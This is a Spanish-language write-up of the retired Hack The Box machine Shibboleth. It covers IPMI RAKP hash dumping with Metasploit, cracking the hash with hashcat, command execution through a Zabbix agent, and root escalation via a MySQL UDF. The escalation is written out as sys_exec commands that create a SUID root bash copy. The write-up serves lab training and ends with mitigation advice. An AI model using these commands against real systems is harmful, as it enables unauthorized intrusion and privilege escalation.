---
machine: Shibboleth
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, ipmi, zabbix, mysql, udf, privesc]
---

# Shibboleth — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una web estática da la pista de automatización BMC. IPMI 2.0 en UDP/623 filtra un hash RAKP que se crackea para entrar en Zabbix. El agente de Zabbix ejecuta comandos y permite una shell; la reutilización de credenciales lleva al usuario `ipmi`, y una CVE de MariaDB/MySQL con carga de un objeto compartido da root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,10050,10051 <IP>
nmap -sU -p623 <IP>
```

- Puertos: `22/tcp` SSH, `80/tcp` HTTP, `10050-10051/tcp` Zabbix y `623/udp` IPMI.
- Servicios: Web estática, IPMI, Zabbix server/agent y MariaDB.
- Tecnologías: IPMI 2.0, Zabbix, MySQL/MariaDB y UDF.

## Enumeración

- `shibboleth.htb` con pocas pistas visibles.
- IPMI responde en UDP/623.
- Zabbix en el puerto 80 con una cuenta válida.
- Agente Zabbix y base MariaDB local.

## Foothold

Se lanza el escáner de hashes IPMI RAKP y se crackea el hash. La contraseña permite entrar en Zabbix; con permisos de administración se configura una comprobación que ejecuta un comando en el agente y devuelve una shell.

```bash
msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <IP>; run'
hashcat -m 7300 ipmi.hash /usr/share/wordlists/rockyou.txt
# Login en Zabbix y crear un item system.run
ssh <USER>@shibboleth.htb
```

## Movimiento lateral

La contraseña de Zabbix se reutiliza para el usuario `ipmi`; desde esa cuenta se enumera la base MariaDB y los permisos locales.

## Escalada de privilegios

La versión de MariaDB permite cargar una biblioteca compartida como root. Se compila un `.so` con una función que ejecuta una shell, se copia a un directorio permitido y se registra como UDF.

```bash
mysql -u root -p
# Compilar el .so y copiarlo a /usr/lib/mysql/plugin/
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"');
/tmp/rootbash -p
```

## Evidencia

- Hash IPMI RAKP capturado y crackeado.
- Ejecución de comandos mediante el agente Zabbix.
- UDF cargada y shell con SUID de root.

## Lecciones aprendidas

- IPMI 2.0 sigue exponiendo hashes crackeables.
- Zabbix mal segmentado permite ejecución en los agentes.
- Las bases de datos con permisos de escritura en plugins son RCE.

## Mitigación y detección

- Restringir IPMI a una red de gestión y usar contraseñas robustas.
- Limitar la administración de Zabbix y las acciones del agente.
- Ejecutar MariaDB sin privilegios y bloquear `plugin_dir`.

## Referencias

- [0xdf — Shibboleth](https://0xdf.gitlab.io/2022/04/02/htb-shibboleth.html)
- [IppSec — Shibboleth](https://www.youtube.com/watch?v=tVXGM10kRwY)
- [Hack The Box — Shibboleth](https://app.hackthebox.com/machines/shibboleth)
